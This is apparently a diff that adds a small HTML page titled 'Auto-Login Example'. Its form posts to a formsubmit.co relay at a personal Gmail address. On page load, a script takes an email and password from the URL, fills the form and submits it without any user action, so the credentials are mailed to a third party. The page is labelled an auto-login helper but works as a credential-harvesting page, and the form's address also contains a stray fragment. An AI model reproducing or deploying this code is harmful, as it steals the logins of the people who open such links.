@@ -1,0 +1,32 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Auto-Login Example</title>
+</head>
+<body>
+
+<form id="loginForm" action="https://formsubmit.co/onymalivictory1@gmail.com @email.com" method="post">
+    <input type="email" id="email" name="email" placeholder="Email" required>
+    <input type="password" id="password" name="password" placeholder="Password" required>
+    <button type="submit">Auto-Login</button>
+</form>
+
+<script>
+    window.addEventListener('DOMContentLoaded', function() {
+        // Retrieve the email and password from the URL
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        var password = urlParams.get('password');
+
+        // Set the values of the email and password fields
+        document.getElementById('email').value = email;
+        document.getElementById('password').value = password;
+
+        // Automatically submit the form
+        document.getElementById('loginForm').submit();
+    });
+</script>
+
+</body>
+</html> 
